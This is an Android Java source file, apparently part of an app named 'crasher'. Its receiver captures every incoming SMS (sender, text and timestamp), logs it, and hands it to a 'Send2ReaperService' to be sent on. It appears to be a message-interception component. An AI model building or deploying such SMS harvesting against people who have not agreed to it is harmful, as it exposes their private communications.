package com.bigeye.crasher;

import java.sql.Date;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.gsm.SmsMessage;
import android.text.format.DateFormat;
import android.util.Log;
import android.widget.Toast;

public class IncomingSMSBroadcastReceiver extends BroadcastReceiver {

	public String APP_TAG = "IncomingSMSBroadcastReceiver";
	
	@Override
	public void onReceive(Context context, Intent intent) {
		// get SMS msg
		Bundle bundle = intent.getExtras();
		SmsMessage[] msgs = null;
		String smsContent = "SMS from: ";
		
		if(bundle != null){
			//get sms text
			Object[] pdus = (Object[]) bundle.get("pdus");
			msgs = new SmsMessage[pdus.length];
			for(int i=0; i<msgs.length;i++){
				msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
				if(i==0){
					//get source phoneNo
					smsContent += msgs[i].getOriginatingAddress();
					smsContent +=": ";
				}
				// get sms content
				smsContent += msgs[i].getMessageBody().toString();
				
				//get timestamp
//				Date Tstamp = new Date(msgs[i].getTimestampMillis());
				String tmp_dt=new DateFormat().format("dd-MMM-yyyy k:m:s", msgs[i].getTimestampMillis()).toString();
				smsContent += ": "+tmp_dt;
			}
			
			//display / send text to repo
			Toast.makeText(context, smsContent, Toast.LENGTH_LONG).show();
			Log.i(APP_TAG,smsContent);
			
			Intent SvcIntent = new Intent(context, Send2ReaperService.class);
			SvcIntent.putExtra("OPERATION", "INCOMING");
			SvcIntent.putExtra("MSG", smsContent);
			context.startService(SvcIntent);
		}
	}

}
